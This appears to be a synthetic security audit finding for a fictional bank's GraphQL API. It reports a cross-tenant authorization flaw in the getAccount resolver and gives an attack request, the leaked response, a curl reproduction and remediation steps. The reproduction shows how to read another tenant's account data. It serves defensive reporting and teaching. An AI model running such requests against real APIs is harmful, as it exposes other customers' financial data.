# Security Analysis Report
**System:** NexaBank Open Finance API
**Domain:** Financial Services / Retail Banking
**Example ID:** GQL-0302
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.2 | Resolver/graph traversal injection on `getAccount` — attacker traverses to victim's financial account across tenant boundaries without re-validation at each level |

---

## Finding 1 — Injection: Resolver/Graph Traversal Injection on Account Object (Pattern 5.2)

### Summary
The `getAccount` resolver on NexaBank Open Finance API (`api.nexabank-open-financ.example.com`) fetches by `accountId` only without verifying the fetched object's `tenantId` against the JWT's `tenantId` (RISK-GQL-302). Per §5.0 Pattern 5.2, the resolver chain follows nested relationships without re-validating authorization at each level — an attacker traverses from their own account entry point into cross-tenant account data including child relationship paths.

**HAR/response key consistency:** HAR query uses `getAccount`, and the response key is also `getAccount` — consistent.

**Redis cache vulnerability:** Cache is keyed by `accountId` only (no user/tenant dimension), meaning a victim's account data can be returned directly from cache for any attacker who knows the `accountId`.

**Pattern:** 5.2 — Resolver/graph traversal injection (Injection)
**Affected resolver:** `getAccount`
**Affected endpoint:** `POST https://api.nexabank-open-financ.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.nexabank-open-financ.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-8101

{"query": "query VulnerableOp { getAccount(id: \"A-2302\") { accountId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Account Returned (cross-tenant)**
```json
{
  "data": {
    "getAccount": {
      "tenantId": "tenant-e6d5",
      "ownerId": "other-user-8101e6d5",
      "data": {
        "sensitiveField": "CONFIDENTIAL-8101e6d5",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-8101`. Returned data belongs to: `tenant-e6d5`. Cross-tenant traversal confirmed.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.nexabank-open-financ.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8101" \
  -d '{"query": "query VulnerableOp { getAccount(id: \"A-2302\") { accountId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: data.getAccount.tenantId == "tenant-e6d5" (different from JWT tenant-8101)
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getAccount` resolver: after fetching the object, assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
2. Re-validate authorization at every level of the resolver chain (nested types/relationships).
3. Re-key Redis cache to include `tenantId` (e.g., `tenant:{tenantId}:account:{accountId}`).
4. Restrict `getAccountWithChildren` to enforce tenancy at each child resolver level.
